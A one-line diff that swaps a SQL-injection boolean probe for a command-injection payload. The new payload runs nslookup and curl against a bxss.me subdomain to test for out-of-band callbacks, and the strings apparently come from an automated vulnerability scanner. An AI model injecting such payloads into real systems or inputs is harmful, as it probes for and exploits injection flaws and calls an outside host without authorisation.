@@ -1,1 +1,1 @@
--1 OR 2+743-743-1=0+0+0+1
+(nslookup -q=cname hitwsyvabpfwd630f1.bxss.me||curl hitwsyvabpfwd630f1.bxss.me))
